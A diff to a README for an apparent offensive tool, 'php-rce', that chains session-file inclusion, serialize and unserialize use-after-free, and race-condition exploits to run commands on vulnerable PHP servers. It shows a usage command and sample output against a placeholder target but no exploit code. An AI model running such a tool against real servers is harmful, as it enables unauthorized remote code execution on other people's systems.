@@ -1,3 +1,27 @@
 * PHP Remote Code Execution
 
-PHP Remote Code Execution.
+Exploit for *CVE-2026-109618* / *CVE-2026-109619*.  Multiple exploits to
+achieve RCE on vulnerable PHP targets.
+
+** Usage
+
+#+begin_src sh
+  $ uv sync
+  $ uv run php-rce --url http://target/index.php --cmd "hostname"
+  target: http://target/index.php  cmd: hostname
+
+  trying session_lfi ...
+      injecting session + scanning 56 LFI paths...
+      found at attempt 23
+
+  vulnerable-hostname
+#+end_src
+
+** Exploits
+
+- session_lfi :: session file inclusion
+- serialize_uaf :: serialize use-after-free
+- unserialize_uaf :: unserialize use-after-free
+- fast_fire :: race-condition based execution
+
+They run sequentially, the first successful one runs the command.
